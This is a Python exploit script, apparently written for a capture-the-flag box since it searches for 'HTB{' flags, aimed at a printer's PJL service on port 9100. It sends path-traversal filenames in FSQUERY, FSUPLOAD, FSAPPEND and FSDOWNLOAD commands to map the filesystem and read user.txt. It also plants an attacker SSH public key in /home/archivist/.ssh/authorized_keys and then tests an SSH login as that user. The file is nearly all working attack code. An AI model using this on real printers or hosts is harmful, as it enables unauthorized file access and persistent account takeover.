#!/usr/bin/env python3
"""PJL path / location escape matrix (lp @ 127.0.0.1:9100)."""
import socket
import subprocess

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)
MARK = b"PWNPATH-ESCAPE-OK\n"

QUERY_PATHS = [
    ".",
    "..",
    "....//....//home/archivist",
    "/home/archivist",
    "/home/archivist/.ssh",
    "0:",
    "0:../.ssh",
    "logs",
    "logs/..",
    "logs/../..",
]

WRITE_PATHS = [
    "../.ssh/authorized_keys",
    "../../home/archivist/.ssh/authorized_keys",
    "/home/archivist/.ssh/authorized_keys",
    "....//....//home/archivist/.ssh/authorized_keys",
    "0:../.ssh/authorized_keys",
    "0:../../.ssh/authorized_keys",
    "../user.txt",
    "logs/../../.ssh/authorized_keys",
    ".ssh/authorized_keys",
    "printer/../.ssh/authorized_keys",
    "%2e%2e/.ssh/authorized_keys",
    "..%2f.ssh%2fauthorized_keys",
]

READ_PATHS = [
    "../user.txt",
    "/home/archivist/user.txt",
    "....//....//home/archivist/user.txt",
    "../.ssh/authorized_keys",
    "/home/archivist/.ssh/authorized_keys",
]


def pjl(payload: bytes, timeout: float = 5) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        out = b""
        while len(out) < 65536:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out


def q(path: str) -> None:
    r = pjl(f'@PJL FSQUERY NAME="{path}"\r\n'.encode(), 4)
    txt = r.decode(errors="replace").replace("\r", "\\r")[:220]
    print(f"Q {path!r} -> {txt}")


def write_upload(path: str) -> None:
    body = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={N}\r\n'.encode() + KEY
    r = pjl(body, 6)
    print(f"W-UP {path!r} -> {repr(r[:100])}")


def write_append(path: str) -> None:
    body = f'@PJL FSAPPEND NAME="{path}"\r\nSIZE={N}\r\n'.encode() + KEY
    r = pjl(body, 6)
    print(f"W-AP {path!r} -> {repr(r[:100])}")


def write_fsd(path: str) -> None:
    body = f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE={N} NAME="{path}"\r\n'.encode() + KEY
    r = pjl(body, 6)
    print(f"W-DL {path!r} -> {repr(r[:100])}")


def read_file(path: str, size: int) -> None:
    for verb in ("FSDOWNLOAD", "FSUPLOAD"):
        spec = f'@PJL {verb} NAME="{path}"\r\nSIZE={size}\r\nOFFSET=0\r\n'
        r = pjl(spec.encode(), 5)
        flagish = b"HTB{" in r or b"htb{" in r
        print(f"R-{verb[:2]} {path!r} len={len(r)} flag={flagish} head={repr(r[:80])}")


print("=== FSQUERY escape map ===")
for p in QUERY_PATHS:
    try:
        q(p)
    except Exception as e:
        print(f"Q {p!r} ERR {e}")

print("\n=== marker write (find real landing dir) ===")
for p in ("pwn_escape.txt", "../pwn_escape.txt", "/tmp/pwn_escape.txt", "../user.txt"):
    m = f'@PJL FSUPLOAD NAME="{p}"\r\nSIZE={len(MARK)}\r\n'.encode() + MARK
    r = pjl(m, 5)
    print(f"MARK-UP {p!r} -> {repr(r[:80])}")

print("\n=== key write matrix (one method each path) ===")
for p in WRITE_PATHS:
    try:
        write_upload(p)
    except Exception as e:
        print(f"W-UP {p} ERR {e}")

print("\n=== append on best guesses ===")
for p in (
    "/home/archivist/.ssh/authorized_keys",
    "0:../.ssh/authorized_keys",
    "....//....//home/archivist/.ssh/authorized_keys",
):
    write_append(p)

print("\n=== read probes ===")
for p in READ_PATHS:
    read_file(p, 80)

print("\n=== ssh ===")
cp = subprocess.run(
    [
        "ssh",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-i",
        "/tmp/id_ed25519",
        "archivist@127.0.0.1",
        "id",
    ],
    capture_output=True,
    text=True,
    timeout=10,
)
print("ssh", cp.returncode, cp.stdout[:80], cp.stderr[:120])